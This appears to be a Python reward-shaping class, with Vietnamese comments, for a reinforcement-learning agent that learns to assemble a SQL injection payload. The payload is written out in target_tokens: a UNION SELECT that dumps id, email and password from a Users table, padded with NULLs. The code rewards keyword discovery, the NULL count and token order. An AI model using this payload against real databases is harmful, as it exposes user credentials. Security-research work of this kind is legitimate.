import numpy as np

class RewardSystem:
    def __init__(self, normal_count, success_marker, error_marker, env_type='training'):
        self.success_marker = success_marker
        self.env_type = env_type
        
        # --- CẤU HÌNH MỤC TIÊU ---
        # Payload mục tiêu đã được token hóa (để so sánh vị trí)
        self.target_tokens = [
            "a'))", " UNION", " SELECT", 
            " id", ",", "email", ",", "password", ",", 
            " NULL", ",", " NULL", ",", " NULL", ",", " NULL", ",", " NULL", ",", " NULL", 
            " FROM Users", "--"
        ]
        # Các từ khóa bắt buộc phải có mặt (Giai đoạn 1)
        self.required_keywords = {"a'))", "UNION", "SELECT", "id", "email", "password", "FROM", "Users", "--"}
        self.target_null_count = 6
        
        # Memory cho Giai đoạn 2 & 3 (Lưu trạng thái tốt nhất đã từng đạt được)
        self.best_keyword_set = set()
        self.last_correct_indices = set() # Lưu các vị trí index đã đúng ở ván trước

    def calculate_reward(self, response, payload):
        """
        Tính điểm theo cơ chế Sướng trước - Khổ sau 3 giai đoạn.
        """
        # Chuẩn hóa payload thành list các token để so sánh vị trí
        # Lưu ý: Cách này giả định payload được ghép từ các action space chuẩn
        # Ta sẽ dùng một hàm clean đơn giản để tách token nếu cần, hoặc giả định input payload ok.
        
        current_reward = 0.0
        done = False
        
        # Phân tích payload hiện tại
        current_upper = payload.upper()
        
        # Đếm số lượng NULL thực tế
        current_null_count = current_upper.count("NULL")
        
        # Tập hợp các từ khóa tìm được trong payload
        found_keywords = set()
        for kw in self.required_keywords:
            if kw.upper() in current_upper: # Check dạng string cho linh hoạt
                found_keywords.add(kw)

        # --- GIAI ĐOẠN 1: GOM ĐỦ MẢNH GHÉP (Discovery) ---
        # Mục tiêu: Tìm đủ các keyword quan trọng (trừ NULL tính riêng)
        missing_keywords = self.required_keywords - found_keywords
        
        if len(missing_keywords) > 0:
            # Chưa đủ mảnh ghép -> Đang ở Phase 1
            # Thưởng nhẹ cho mỗi từ khóa mới tìm thấy
            current_reward += len(found_keywords) * 0.1 
            current_reward -= 0.5 # Phạt duy trì như bạn yêu cầu (độ dài/NULL chưa đủ)
            
            # Nếu tìm thấy keyword mới chưa từng thấy -> Thưởng đậm để khích lệ
            new_discovery = found_keywords - self.best_keyword_set
            if new_discovery:
                current_reward += 1.0 # Thưởng +1 như yêu cầu
                self.best_keyword_set.update(new_discovery)
                
            return current_reward, False

        # --- GIAI ĐOẠN 2: GIỮ VỮNG & THÊM NULL (Accumulation) ---
        # Đến đây tức là đã đủ các từ khóa cơ bản (UNION, SELECT, id...)
        # Giờ check số lượng NULL
        
        # Kiểm tra xem có đánh rơi từ khóa nào không (Luật: Không được mất mảnh ghép)
        if not found_keywords.issuperset(self.best_keyword_set):
            return -1.0, False # Phạt nặng nếu làm mất từ khóa đã tìm được
        
        current_reward += 0.2 # Thưởng vì giữ được từ khóa (như yêu cầu)

        if current_null_count != self.target_null_count:
            # Chưa đủ NULL
            diff = abs(self.target_null_count - current_null_count)
            current_reward -= (diff * 0.1) # Phạt -0.1 cho mỗi NULL thiếu/thừa
            return current_reward, False
        else:
            # Đã đủ NULL
            current_reward += 5.0 # Thưởng +5 như yêu cầu
            
        # --- GIAI ĐOẠN 3: SẮP XẾP VỊ TRÍ (Ordering) ---
        # Đến đây là đủ nguyên liệu: Keyword đủ, NULL đủ. Giờ soi vị trí.
        # Ta cần tách payload thành list token để so sánh với self.target_tokens
        # (Đây là bước giả lập, thực tế cần parser tốt hơn hoặc mapping từ action history)
        
        # Giả sử ta so sánh tương đối dựa trên thứ tự xuất hiện trong chuỗi
        # Để chính xác tuyệt đối, ta nên truyền vào list action_history thay vì string payload.
        # Ở đây tôi sẽ dùng logic check string tương đối.
        
        score_phase_3 = 0
        current_correct_indices = set()
        
        # Logic check vị trí (Simplified):
        # Kiểm tra xem các cụm từ có đứng đúng thứ tự tương đối không?
        # Ví dụ: UNION phải đứng trước SELECT, SELECT phải đứng trước id...
        
        # Tuy nhiên, để làm đúng yêu cầu "+0.3 đúng vị trí, -0.4 sai vị trí"
        # Ta cần ánh xạ chính xác. 
        
        # MẸO: Kiểm tra string con. 
        # Nếu payload bắt đầu bằng "a')) UNION SELECT" -> 3 thằng đầu đúng -> +0.9
        
        temp_payload = payload
        match_count = 0
        mismatch_count = 0
        
        # Duyệt qua từng token mục tiêu
        last_found_index = -1
        is_order_broken = False
        
        for idx, token in enumerate(self.target_tokens):
            # Tìm token này trong payload
            found_at = temp_payload.find(token)
            
            if found_at != -1:
                # Có tồn tại
                if found_at > last_found_index and not is_order_broken:
                    # Đúng thứ tự xuất hiện (Token sau nằm sau token trước)
                    # Và chuỗi chưa bị gãy
                    score_phase_3 += 0.3
                    current_correct_indices.add(token)
                    last_found_index = found_at
                else:
                    # Sai thứ tự (nằm trước cái cần nằm sau) hoặc chuỗi đã gãy
                    score_phase_3 -= 0.4
                    is_order_broken = True 
                    # (Hoặc vẫn trừ tiếp nếu bạn muốn phạt gắt từng từ)
            else:
                # Thiếu token (lẽ ra không nên vào đây vì đã qua Phase 1,2)
                score_phase_3 -= 0.5

        # LUẬT: Lượt n+1 BẮT BUỘC GIỮ NGUYÊN cái đúng
        # So sánh với memory của ván trước
        lost_correct_position = self.last_correct_indices - current_correct_indices
        if lost_correct_position:
            # Nếu ván trước đã đặt đúng từ X, mà ván này lại làm sai từ X
            # -> PHẠT CỰC NẶNG (để ép nó học luật "Cấm thay đổi cái đúng")
            score_phase_3 -= 2.0 
        
        # Cập nhật Memory
        self.last_correct_indices = current_correct_indices
        
        current_reward += score_phase_3
        
        # Check Win Tuyệt Đối
        if payload.strip() == "".join(self.target_tokens).strip():
             return 100, True # End Game
             
        return current_reward, False
    
    def reset(self):
        """
        Reset trạng thái memory khi qua ván mới (Episode mới).
        Cần gọi hàm này từ TrainingEnvironment.reset().
        """
        self.best_keyword_set = set()
        self.last_correct_indices = set()